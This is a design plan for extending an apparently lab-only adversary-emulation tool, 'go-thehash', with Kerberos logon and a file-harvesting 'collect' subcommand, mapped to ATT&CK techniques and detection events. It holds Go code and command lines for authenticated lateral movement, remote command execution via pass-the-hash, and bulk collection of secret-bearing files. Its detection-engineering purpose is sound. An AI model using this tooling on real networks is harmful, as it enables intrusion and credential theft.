# go-thehash Extension Plan — Kerberos Authentication & Automated Collection

## 1. Purpose

Extend `go-thehash` so a single binary can cover two techniques currently missing from the
q3-plan detection scope, without modifying the vendored `go-smb` library:

| Target technique | How it is covered |
|---|---|
| **T1078.002 — Valid Accounts: Domain Accounts** | Kerberos password authentication (`-krb -p`) |
| **T1119 — Automated Collection** | New `collect` subcommand (recursive search + copy by criteria) |

Existing capabilities stay unchanged and remain the primary path for their techniques:

| Existing capability | Technique | Notes |
|---|---|---|
| NTLM hash auth (`<nt-hash>`) | T1550.002 | Pass-the-Hash — keep default |
| `exec` (MS-SCMR) | T1569.002 | Service execution — already present, now re-used as the plan's T1569.002 row |
| `exec-wmi` (DCOM/WMI) | T1021.003 + T1047 | Phase 4 |
| `put`/`get`/`del`/`ls` | T1021.002 / T1570 / T1083 | Phase 2–4 |

**Outcome:** one binary yields distinct detection signals for T1078.002 (Kerberos: `4768`/`4769`)
and T1550.002 (NTLM: `4624 type 3 NtLmSsp`, no `4768/4769`), so the two are no longer
indistinguishable on the wire.

---

## 2. Current state and evidence

### 2.1 What blocks T1078.002 today

- `main.go` requires a positional `<nt-hash>` in every subcommand and authenticates only via
  `session.Connect` → `spnego.NTLMInitiator{... Hash: hashBytes}`.
- `internal/session/session.go:12-27` hardcodes the hash path; no password or Kerberos branch.
- `README.md:5` explicitly states "Authenticates via NTLMv2 using a raw NT hash — no plaintext
  password, no Windows credential store, **no Kerberos**."

### 2.2 The vendored library already supports everything needed

| Capability | Evidence |
|---|---|
| Plaintext password in NTLM client | `go-smb/ntlmssp/client.go:56` (`Password string`); `:312-316` chooses `Ntowfv2(Password, …)` when `Hash == nil` |
| Password in SPNEGO NTLM initiator | `go-smb/spnego/ntlmssp.go:42` (`Password string`); `:81-83` derives the NT hash from the password |
| **Kerberos initiator** | `go-smb/spnego/krb5ssp.go:61` (`KRB5Initiator{User, Password, Hash, AESKey, Domain, DCIP, SPN, …}`) |
| Kerberos client init from password | `go-smb/krb5ssp/krb5ssp.go:304` → `InitKerberosClient(…, password, …)` |
| SPN alias fallback (`cifs/` → `HOST/`) | `go-smb/krb5ssp/krb5ssp.go:75` (`defaultSPNAliases` mirrors AD sPNMappings) |
| DCE style for DCOM | `go-smb/spnego/krb5ssp.go:104` (`EnableDCEStyle`) |
| Pluggable initiator | `go-smb/smb/session.go:130` (`Initiator gss.Mechanism`) — both initiators satisfy it |
| Recursive remote listing | `go-smb/smb/session.go:1424` (`ListRecurseDirectory`) |
| Remote file read | `go-smb/smb/session.go:1578` (`RetrieveFile`) |

**Conclusion:** no changes to `go-smb` are required. Work is confined to two existing files plus
one new file in `internal/fileops`.

---

## 3. Scope of change

### 3.1 Authentication model

Add a Kerberos path behind an explicit flag; keep NTLM hash as the default (backward compatible).

```
go-thehash [-o <file>] [-krb] [-dcip <ip>] <subcommand> <target> <domain> <user> <credential> ...
```

| Flag | Meaning |
|---|---|
| `-krb` | Use Kerberos (`KRB5Initiator`) instead of NTLM |
| `-dcip <ip>` | Optional explicit KDC (else derived from DNS) |
| `<credential>` slot | With `-krb`: **password** (for T1078.002). Without `-krb`: **32-hex NT hash** |

- With `-krb` and a password → `KRB5Initiator.Password` → **T1078.002**.
- With `-krb` and a 32-hex value → `KRB5Initiator.Hash` → overpass-the-hash → **T1550.002**.
- Without `-krb` → NTLM hash → **T1550.002** (unchanged behavior).

> **Decision — Kerberos over NTLM password.** An NTLM-plaintext logon is technically a valid-account
> use but produces the same target telemetry as Pass-the-Hash (`4624 type 3 NtLmSsp`, no
> `4768/4769`), so mapping it to T1078.002 would overlap the existing T1550.002 detection.
> Kerberos produces `4768` (AS-REQ) + `4769` (TGS-REQ) + a Kerberos `4624`, which is the distinct
> AN0590 signal. NTLM password mode is therefore **out of scope** (P2, not recommended).

### 3.2 New `collect` subcommand (T1119)

```
go-thehash collect <target> <domain> <user> <credential> <share> <remote-dir> <local-dir> [pattern]
```

Behavior: recursively enumerate `\\<target>\<share>\<remote-dir>`, select files matching
`pattern` and a keyword/extension filter, retrieve each match with `RetrieveFile`, and write it
under `local-dir` preserving the relative path. This is "automated collection by criteria", not a
single `get`; it must be recursive and criteria-driven to satisfy T1119.

> **Decision — native `collect` over PowerShell + `net use`.** Both work. Native `collect` keeps
> everything in the one binary, avoids `net.exe`, and lets the same authenticated session that
> proves T1078.002 also perform collection. Use the PowerShell/mount route as the fallback if the
> tool is not extended.

---

## 4. File-by-file changes

### 4.1 `internal/session/session.go`

Add a Kerberos connector alongside the existing one; leave `Connect` untouched for
backward compatibility.

```go
// ConnectKerb establishes an SMB session authenticated with Kerberos.
// target must be a hostname (not an IP) so the SPN can be formed.
func ConnectKerb(target, domain, user, password, dcip string) (*smb.Connection, error) {
    if net.ParseIP(target) != nil {
        return nil, fmt.Errorf("-krb requires a hostname target, not an IP")
    }
    ini := &spnego.KRB5Initiator{
        User:     user,
        Password: password,
        Domain:   domain,
        SPN:      "cifs/" + target,
        DCIP:     dcip, // optional; empty = resolve KDC via DNS
    }
    options := smb.Options{Host: target, Port: 445, Initiator: ini}
    session, err := smb.NewConnection(options)
    if err != nil {
        return nil, fmt.Errorf("Kerberos SMB connect to %s: %w", target, err)
    }
    if !session.IsAuthenticated() {
        session.Close()
        return nil, fmt.Errorf("kerberos authentication failed for %s\\%s", domain, user)
    }
    return session, nil
}
```

- Add `net`, `strings` imports; `spnego` is already imported.
- Optional (P2): a verbose `-debug` hook to surface gokrb5 errors (clock skew / KDC unreachable),
  which otherwise surface as opaque auth failures.

### 4.2 `main.go`

1. Extend the pre-dispatch flag parser (currently only `-o`, `main.go:121-130`) to consume any
   combination of `-o <file>`, `-krb`, and `-dcip <ip>`.
2. Add a single helper so every branch selects the connector:

```go
func dial(target, domain, user, credential string, useKrb bool, dcip string) (*smb.Connection, error) {
    if useKrb {
        return session.ConnectKerb(target, domain, user, credential, dcip)
    }
    return session.Connect(target, domain, user, credential)
}
```

3. Replace the existing `session.Connect(...)` calls in every branch with `dial(...)` (8 call
   sites: `put/get/del/ls/exec/exec-wmi/pipe/enum`).
4. Add the `collect` case dispatching to `fileops.CollectFiles`.
5. Update `usage()` (`main.go:66-115`): add `-krb`, `-dcip`, the `collect` form, and examples.

### 4.3 `internal/fileops/collect.go` (new)

```go
// CollectFiles recursively enumerates a remote share directory, selects files
// matching pattern/extension/keyword criteria, and retrieves them to localDir
// preserving relative paths. Returns the number of files collected.
func CollectFiles(session *smb.Connection, share, remoteDir, localDir, pattern string,
    exts []string, keywords []string) (int, error) {

    files, err := session.ListRecurseDirectory(share, remoteDir, pattern)
    if err != nil {
        return 0, fmt.Errorf("ListRecurseDirectory \\\\%s\\%s: %w", share, remoteDir, err)
    }
    n := 0
    for _, f := range files {
        if f.IsDir || !matches(f, exts, keywords) {
            continue
        }
        rel := relativeTo(f.FullPath, remoteDir)          // preserve tree
        dst := filepath.Join(localDir, rel)
        os.MkdirAll(filepath.Dir(dst), 0o755)
        if err := GetFile(session, share, f.FullPath, dst); err != nil {
            return n, err
        }
        n++
    }
    fmt.Printf("[+] Collected %d file(s) from \\\\%s\\%s\\%s -> %s\n", n, share, share, remoteDir, localDir)
    return n, nil
}
```

- Reuses `ListRecurseDirectory` (`session.go:1424`) and `RetrieveFile` (`session.go:1578`).
- `matches` filters on extension set (e.g. `.config .json .cs .sql .pfx .key .ps1`) plus name
  keywords (e.g. `connectionString`, `secret`, `password`).
- Junctions are already skipped by `ListRecurseDirectory`, so no loop risk.

### 4.4 `README.md`

- Replace the "no Kerberos" claim (line 5) with the dual-auth description.
- Add `-krb`, `-dcip`, and `collect` to Subcommands / Arguments / Examples.
- Add **T1078.002** and **T1119** to the ATT&CK list (line 7).
- Add a Detection-signals row: Kerberos logon → `4768`/`4769` + `4624`.

### 4.5 `Flow.md`

Add behavior rows (continue numbering):

| # | Behavior | Artifact | Tactic / TID |
|---|---|---|---|
| 18 | tool (`-krb`) authenticates SMB2 via Kerberos: AS-REQ/TGS-REQ with password, AP-REQ to service | ticket requests on KDC [identity] | Persistence, Privilege Escalation, Stealth / **T1078.002** — Valid Accounts: Domain Accounts |
| 19 | tool (`collect`) recursively enumerates share and retrieves files matching criteria | files copied local [file] | Collection / **T1119** — Automated Collection |
| 19b | (same behavior) files sourced from an SMB network share | — | Collection / T1039 — Data from Network Shared Drive |

---

## 5. Command reference (after the change)

```text
# Kerberos valid-account logon (T1078.002), then list/read a share
# <domain> is the Kerberos realm (DNS domain); a short NetBIOS name is
# accepted and the realm derived from the <target> FQDN suffix.
go-thehash -krb -dcip 10.12.10.10 ls  iis01.testlab.local TESTLAB.LOCAL svc_app_dev 'D3vPortal!2025' DevPortal .
go-thehash -krb -dcip 10.12.10.10 get iis01.testlab.local TESTLAB.LOCAL svc_app_dev 'D3vPortal!2025' DevPortal appsettings.json ./appsettings.json

# Automated collection over the share (T1119)
go-thehash -krb -dcip 10.12.10.10 collect iis01.testlab.local TESTLAB.LOCAL svc_app_dev 'D3vPortal!2025' DevPortal . ./collect "*.config"

# Explicit KDC
go-thehash -krb -dcip 10.12.10.10 collect IIS01 ... DevPortal . ./collect "*.json"

# Regression: Pass-the-Hash path unchanged (T1550.002)
go-thehash exec DC01 TESTLAB Administrator 41c46bf7... "%COMSPEC% /c whoami > C:\Windows\Temp\out.txt"
```

---

## 6. Technique mapping

| Behavior | Tactic(s) | TID | Distinct detection signal |
|---|---|---|---|
| `-krb` password authentication to IIS01 | Persistence / Privilege Escalation / Stealth | **T1078.002** | DC: `4768` AS-REQ + `4769` TGS-REQ; target: Kerberos `4624` — AN0590 |
| `collect` recursive search + copy by criteria | Collection | **T1119** | recursive `FIND` + bulk `RetrieveFile` into local dir; AN for automated collection |
| (same `collect` run) source is a network share | Collection | T1039 | SMB2 `TreeConnect` + read of many files on one share |
| `exec` (MS-SCMR) | Execution | T1569.002 | transient service create/start/delete; Event 7045 |
| NTLM hash auth (default) | Lateral Movement | T1550.002 | `4624` type 3 `NtLmSsp` without `4768/4769` — AN1144 |

---

## 7. Environment prerequisites

| Requirement | Detail | Failure symptom |
|---|---|---|
| Target is a **hostname** | `iis01.testlab.local`, not `10.12.10.20` (`krb5ssp.go:146-151` rejects IP in SPN) | `Invalid SPN, expected a hostname` |
| KDC reachable | DC01 reachable on tcp/88; or pass `-dcip 10.12.10.10` | auth timeout / "cannot contact KDC" |
| Realm is DNS-resolvable | `<domain>` must be the Kerberos realm (DNS domain, `TESTLAB.LOCAL`). A short NetBIOS name is auto-expanded from the `<target>` suffix; without this, gokrb5 looks up `TESTLAB:88` and fails `lookup TESTLAB: no such host` | KDC discovery failure |
| Clock sync | WS01↔DC01 skew ≤ 5 min | `KRB_AP_ERR_SKEW` |
| Domain account | `-krb` not valid for local accounts (`domain = "."`) | auth failure |
| Encryption types | Account must support an etype gokrb5 can derive from the password (AES preferred; RC4 only if permitted) | `KDC_ERR_ETYPE_NOSUPP` |

---

## 8. Build & test

### 8.1 Build

```powershell
cd resources\payloads\lateral-movement\go-thehash
go mod tidy
$env:GOOS = "windows"; $env:GOARCH = "amd64"; go build -ldflags="-s -w" -o go-thehash.exe .
```

### 8.2 Test matrix

| # | Test | Command | Expected |
|---|---|---|---|
| 1 | Regression — NTLM hash | `go-thehash ls DC01 TESTLAB Administrator <hash> C$ Windows\Temp` | unchanged output; `4624` NtLmSsp |
| 2 | Kerberos password | `go-thehash -krb -dcip 10.12.10.10 ls iis01.testlab.local TESTLAB.LOCAL svc_app_dev <pw> DevPortal .` | auth OK; DC `4768` + `4769`; target Kerberos `4624` |
| 3 | Kerberos wrong password | same with bad password | clean failure, no crash |
| 4 | Collect | `go-thehash -krb collect iis01... svc_app_dev <pw> DevPortal . ./collect "*.config"` | files present under `./collect` with tree preserved |
| 5 | IP target guard | `go-thehash -krb ls 10.12.10.20 ...` | explicit "requires a hostname" error |

### 8.3 Evidence

- Export DC Security log `4768`/`4769` for `svc_app_dev` during test 2.
- Export IIS01 Security `4624` (Kerberos) for the same window.
- Capture `go-thehash` stdout showing `[+] Authenticated as …` and collected file count.

---

## 9. Risks & rollback

| Risk | Mitigation |
|---|---|
| Clock skew in lab breaks Kerberos | Sync WS01/IIS01/DC01 time; document in Setup.md |
| Account uses RC4-only or AES-only mismatch | Verify `msDS-SupportedEncryptionTypes`; test before the evaluation run |
| Password mode accidentally chosen for T1550.002 row | T1078.002 rows must use `-krb`; T1550.002 rows must use the default hash path |
| Documentation drift | Update README.md + Flow.md in the same change (see 4.4/4.5) |

**Rollback:** revert `internal/session/session.go` and `main.go`, delete
`internal/fileops/collect.go`, rebuild. No library changes to unwind.

---

## 10. Out of scope

- Kerberos for DCOM/WMI beyond what `EnableDCEStyle` already provides.
- ccache / keytab authentication paths (`KRB5Initiator` supports them; not needed here).
- NTLMv1, SMB1, SMB signing/encryption changes.
- A protocol change to the `smbpipe-agent` pipe channel.
- Changing the plan's Phase files — this document only prepares the tool; Reference Table rows
  are authored separately via `write-phase` / `write-detection-criteria`.

---

## 11. Priorities

| Priority | Item |
|---|---|
| **P0** | `-krb` Kerberos connector + flag (`session.ConnectKerb`, `dial()`), README/Flow updates |
| **P0** | `collect` subcommand (`internal/fileops/collect.go`, `main.go` dispatch) |
| **P1** | Test matrix + evidence capture (section 8) |
| **P2** | NTLM password mode (not recommended for T1078.002; overlaps PtH) |
| **P2** | verbose Kerberos error surface (`KRB_AP_ERR_SKEW`, KDC unreachable) |
